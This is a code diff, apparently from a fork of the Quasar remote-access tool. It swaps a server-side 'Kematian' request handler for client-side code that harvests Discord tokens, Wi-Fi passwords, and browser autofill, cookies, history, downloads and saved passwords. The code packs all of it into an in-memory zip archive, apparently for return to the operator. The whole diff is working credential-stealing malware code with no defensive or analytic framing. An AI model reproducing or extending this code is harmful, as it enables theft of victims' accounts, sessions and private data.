@@ -1,56 +1,61 @@
-﻿using System;
+using Quasar.Client.Kematian.Browsers;
+using Quasar.Client.Kematian.Discord;
+using Quasar.Client.Kematian.Wifi;
+using System;
+using System.Diagnostics;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
-using System.Text;
-using System.Windows.Forms;
-using DarkModeForms;
-using Quasar.Common.Messages;
-using Quasar.Common.Messages.Monitoring.Kematian;
-using Quasar.Common.Messages.other;
-using Quasar.Common.Models;
-using Quasar.Common.Networking;
-using Quasar.Server.Helper;
-using Quasar.Server.Messages;
-using Quasar.Server.Models;
-using Quasar.Server.Networking;
+using System.IO.Compression;
+using System.Threading.Tasks;
 
-namespace Quasar.Server.Kematian
+
+namespace Quasar.Client.Kematian
 {
-    public class KematianHandler : MessageProcessorBase<object>
+    public class Handler
     {
-        private readonly Client[] _clients;
-
-        public KematianHandler(Client[] clients) : base(true)
+        // create a zip file in memory and return the bytes
+        public static byte[] GetData()
         {
-            _clients = clients;
-        }
-
-        /// <inheritdoc />
-        public override bool CanExecute(IMessage message) => message is GetKematian;
-
-        /// <inheritdoc />
-        public override bool CanExecuteFrom(ISender sender) => _clients.Any(c => c.Equals(sender));
-
-        /// <inheritdoc />
-        public override void Execute(ISender sender, IMessage message)
-        {
-            switch (message)
+            byte[] data = null;
+            using (var memoryStream = new MemoryStream())
             {
-                case GetKematian pass:
-                    Execute(sender, pass);
-                    break;
-            }
-        }
+                // make zip archive in mem stream
+                using (var archive = new ZipArchive(memoryStream, ZipArchiveMode.Create, true))
+                {
+                    var retriever = new BrowsersRetriever();
 
-        public void BenginRecovery()
-        {
-            var req = new GetKematian();
-            foreach (var client in _clients.Where(client => client != null))
-            {
-                client.Send(req);
-            }
+                    var methods = new KeyValuePair<Func<string>, string>[]
+                    {
+                                new KeyValuePair<Func<string>, string>(GetTokens.Tokens, "Discord\\tokens.txt"),
+                                new KeyValuePair<Func<string>, string>(GetWifis.Passwords, "Wifi\\Wifi.txt"),
+                                new KeyValuePair<Func<string>, string>(retriever.GetAutoFillData, "Browsers\\autofill.json"),
+                                new KeyValuePair<Func<string>, string>(retriever.GetCookies, "Browsers\\cookies_netscape.txt"),
+                                new KeyValuePair<Func<string>, string>(retriever.GetDownloads, "Browsers\\downloads.json"),
+                                new KeyValuePair<Func<string>, string>(retriever.GetHistory, "Browsers\\history.json"),
+                                new KeyValuePair<Func<string>, string>(retriever.GetPasswords, "Browsers\\passwords.json"),
+                    };
 
+                    foreach (var methodPair in methods)
+                    {
+                        try
+                        {
+                            var content = methodPair.Key();
+                            var zipEntry = archive.CreateEntry(methodPair.Value);
+                            using (var entryStream = new BufferedStream(zipEntry.Open()))
+                            using (var streamWriter = new StreamWriter(entryStream))
+                            {
+                                streamWriter.Write(content);
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Debug.WriteLine($"Error processing {methodPair.Value}: {ex.Message}");
+                        }
+                    }
+                }
+                data = memoryStream.ToArray();
+            }
+            return data;
         }
     }
 }
